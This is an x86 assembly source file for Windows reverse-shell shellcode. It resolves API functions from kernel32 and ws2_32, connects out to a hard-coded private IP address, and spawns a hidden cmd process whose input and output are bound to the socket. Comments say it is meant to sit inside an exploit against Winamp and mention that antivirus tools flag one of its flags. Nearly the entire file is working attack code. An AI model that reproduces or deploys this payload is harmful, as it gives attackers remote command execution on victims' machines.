
format PE console
use32
entry start

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;http://www.hick.org/code/skape/papers/win32-shellcode.pdf
;http://sh3llc0d3r.com/windows-reverse-shell-shellcode-i/
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;Obtain the kernel32.dll base address
;Find the address of GetProcAddress function
;Find the address virtualAlloc function
;Call virtualAlloc(0x0C000000)
;Save in memory function addresses of: kernel32.dll(+0x0), GetProcAddress(+0x4) and VirtualAlloc(+0x8)
;Find the ExitProcess function address and save it in position: 0x0C000000 + 0xC
;Find the CreateProcess function address and save it in position: 0x0C000000 + 0x10
;Find the LoadLibrary function address and save it in position: 0x0C000000 + 0x14
;Find the ws2_32 library and save it in position: 0x0C000000 + 0x18
;Find the WSAStartUp function and save it in position: 0x0C000000 + 0x1c
;Call WSAStartUp
;Find the WSASocketA function and save it in position: 0x0C000000 + 0x20
;Call WSASocket(AF_INET=2, SOCK_STREAM=1,IPPROTO_TCP=6,NULL,NULL,NULL)
;Get the function name connect and save it in position: 0x0C000000 + 0x24
;Call connect(s1,(SOCKADDR*)&hax, sizeof(hax)=16);
;Call CreateProcess(NULL,&cmd,NULL,NULL,TRUE,0,NULL,NULL,&startupinfo,&processinformation)
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;When you use this shellcode inside an exploit it doesn't work
;I don't know why executing this alone only call once to WSPStartup
;but inside the exploit(winamp) WSPStartup is called again by WSASocketA
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

start:

push eax
push ebx
push ecx
push edx
push esi
push edi
push ebp

;Find kernel32.dll base address

xor ecx,ecx
mov eax,[fs:ecx+0x30]
mov eax,[eax+0xc]
mov esi,[eax+0x14]
lodsd
xchg eax,esi
lodsd
mov ebx,[eax+0x10]

;Find the export table of kernel32.dll
mov edx,[ebx+0x3c]
add edx,ebx
mov edx,[edx+0x78]
add edx,ebx
mov esi,[edx+0x20]
add esi,ebx
xor ecx,ecx

Get_Function:        ;GetProcAddress  (hmodule, functionname)
        inc ecx
        lodsd
        add eax,ebx
        cmp dword [eax],0x50746547
        jnz Get_Function
        cmp dword [eax+0x4],0x41636f72
        jnz Get_Function
        cmp dword [eax+0x8],0x65726464
        jnz Get_Function

;Find the address of GetProcAddress function
mov esi, [edx + 0x24]               ; ESI = Offset ordinals
add esi, ebx                        ; ESI = Ordinals table
mov cx, [esi + ecx * 2]             ; CX = Number of function
dec ecx
mov esi, [edx + 0x1c]               ; ESI = Offset address table
add esi, ebx                        ; ESI = Address table
mov edx, [esi + ecx * 4]            ; EDX = Pointer(offset)
add edx, ebx                        ; EDX = GetProcAddress


;Find the VirtualAlloc function address
xor ecx, ecx
push ecx
push ebx
push edx
push ecx
push ecx
push 0x636F6C6C
push 0x416C6175
push 0x74726956
push esp
push ebx
call edx

;Call VirtualAlloc() to reserve memory
push eax
push 0x40
push 0x3000
push 0xB000
push 0x0C000000
call eax


;Save in memory function addresses of: kernel32.dll, GetProcAddress and VirtualAlloc
mov ebx, [esp+0x1C]
mov eax, [esp+0x18]
xor ecx, ecx
mov ecx, 0x0c000000
mov [ecx], ebx         ; Save kernell32.dll address in 0x0C000000
mov [ecx+0x4], eax     ; Save GetProcAddress address in 0x0C000000 + 0x4
pop edx
mov [ecx+0x8], edx     ; Save VirtualAlloc address in 0x0C000000 + 0x8


;Find the ExitProcess function address and save it in position: 0x0C000000 + 0xC
xor ecx, ecx
push ecx
mov ecx, 0x61737365                 ;essa
push ecx
sub dword [esp + 0x3], 0x61         ; Remove a
push 0x636F7250                     ; Proc
push 0x74697845                     ; Exit
push esp
call mykernel32
mov [ecx+0xC], eax

;Find the CreateProcessA function address and save it in position: 0x0C000000 + 0x10
xor ecx, ecx
push ecx
mov ecx, 0x4173                     ;sA
push ecx
push 0x7365636f                     ; oces
push 0x72506574                     ; Proc tePr
push 0x61657243                     ; Exit Crea
push esp
call mykernel32
mov [ecx+0x10], eax

;Find the LoadLibrary function address and save it in position: 0x0C000000 + 0x14
xor ecx, ecx
push ecx
push 0x41797261                     ; aryA
push 0x7262694c                     ; Libr
push 0x64616f4c                     ; Load
push esp
call mykernel32
mov [ecx+0x14], eax

;Load ws2_32 library and save the handle in position: 0x0C000000 + 0x18
xor ecx,  ecx
push ecx
mov cx,0x3233              ; 32
push ecx
push dword 0x5f327377      ; 32.d
push esp                   ; "ws2_32.dll"
call eax
mov ecx, 0x0c000000
mov [ecx+0x18], eax

;Find the WSAStartUp function and save it in position: 0x0C000000 + 0x1c
xor ecx,  ecx
push ecx
mov ecx,0x7075              ; up
push ecx
push dword 0x74726174      ; tart
push dword 0x53415357      ; wsas
push esp                   ; "wsastartup"
call myws32
mov [ecx+0x1c], eax


;Call WSAStartUp
xor ecx,ecx
push ecx
mov cx, 0x0190
sub esp,ecx
push esp
push ecx
call eax


;Find the WSASocketA function and save it in position: 0x0C000000 + 0x20
xor ecx,  ecx
push ecx
mov ecx,0x4174             ;'\0\0At'
push ecx
push dword 0x656b636f      ; 'ekco'
push dword 0x53415357      ; 'SASW'
push esp                   ; "WSASocket"
call myws32
mov [ecx+0x20], eax

;Call WSASocket
xor ecx,ecx
push ecx
push ecx
push ecx
xor ebx,ebx
mov bl,6
push ebx
inc ecx
push ecx
inc ecx
push ecx
call eax                ;WSASocket(AF_INET=2, SOCK_STREAM=1,IPPROTO_TCP=6,NULL,NULL,NULL)
xchg eax,esi


; Get the function name connect and save it in position: 0x0C000000 + 0x24
xor ecx,ecx
mov ecx,0x74636565
shr ecx,8
push ecx
push 0x6e6e6f63
push esp
call myws32
mov [ecx+0x24], eax


; Call connect
xor ecx,ecx
push ecx
;push 0x6838a8c0                 ;0xc0, 0xa8, 0x38, 0x68 = 192.168.56.104
push 0x0c0ba8c0                 ;0xc0, 0xa8, 0xb, 0xc = 192.168.11.12
mov ecx,0x5c110102
dec ch
push ecx
mov ebx,esp
xor ecx,ecx
mov cl,0x10
push ecx
push ebx
push esi
call eax                        ;connect(s1,(SOCKADDR*)&hax, sizeof(hax)=16);



;Call CreateProcess with redirected streams

xor ecx,ecx
push ecx
mov cl,0x54
sub esp,ecx
mov edi,esp
push edi
xor eax,eax
rep stosb
pop edi
mov byte [edi],0x44
inc byte [edi + 0x2d] ;dwFlags attribute must have the STARTF_USESTDHANDLES
;inc byte [edi + 0x2c] ;dwFlags STARTF_USESHOWWINDOW
push edi
mov eax,esi
lea edi,[edi+0x38]
stosd
stosd
stosd
pop edi
xor eax,eax
lea esi,[edi+0x44]
push esi
push edi
push eax
push eax
push 0x08000000         ;CREATE_NO_WINDOW = 0x08000000 AV triggers with this
inc eax
push eax
dec eax
push eax
push eax
push esp
pop eax
add eax,0x80
mov dword [eax],0x00646d63      ;Using a pointer instead of string directly
;All the string c:\\....
;mov dword [esp+0x80],0x775c3a43
;mov dword [esp+0x84],0x6f646e69
;mov dword [esp+0x88],0x735c7377
;mov dword [esp+0x8c],0x65747379
;mov dword [esp+0x90],0x5c32336d
;mov dword [esp+0x94],0x2e646d63
;mov dword [esp+0x98],0x00657865
push eax
xor eax,eax
push eax
xor ecx,ecx
mov ecx, 0x0c000000
mov eax, [ecx+0x10]
call eax                        ;CreateProcess(NULL,&cmd,NULL,NULL,TRUE,0,NULL,NULL,&sui,&pi);


;Call the ExitProcess function
xor ecx, ecx                    ; ECX = 0
push ecx                        ; Return code = 0
mov ecx, 0x0c000000
mov eax, [ecx+0xC]
call eax                        ; ExitProcess

mykernel32:

     pop     ebp
     mov     ecx, 0C000000h
     push    dword [ecx]
     call    dword [ecx+0x4]
     mov     ecx, 0C000000h
     push    ebp
     ret


myws32:
     pop     ebp
     mov     ecx, 0C000000h
     push    dword [ecx+0x18]
     call    dword [ecx+0x4]
     mov     ecx, 0C000000h
     push    ebp
     ret
